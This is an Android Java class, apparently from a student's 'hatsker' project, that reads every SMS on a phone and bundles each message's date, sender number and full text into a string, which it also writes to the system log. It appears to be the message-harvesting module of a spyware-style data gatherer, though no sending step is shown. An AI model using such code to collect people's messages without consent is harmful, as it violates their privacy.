package com.example.student.hatsker;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.util.Log;

import java.util.Date;


public class SmsGatherer implements Gatherer {



    public String getInfo(Context context)
    {

        Cursor c = context.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        StringBuilder stringBuilder = new StringBuilder();
        int totalSMS;

        try {
            totalSMS = c.getCount();
        }
        catch (NullPointerException e) {
            return "No sms found";
        }

        if (totalSMS >0) {

            stringBuilder.append("Total sms:" + Integer.toString(totalSMS));

            if (c.moveToFirst()) {

                c.moveToFirst();
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));

                    stringBuilder.append("\nDate:" + new Date(Long.valueOf(smsDate)).toString() +
                            "\nNumber:" + c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) +
                            "\nBody:" + c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)) +
                            "\n-------------------------------");

                    c.moveToNext();
                }
            }

            c.close();

            Log.i("asd",stringBuilder.toString());
            return stringBuilder.toString();
        }
        else
        {
            Log.i("asd",stringBuilder.toString());
            return "No sms found";
        }
    }
}
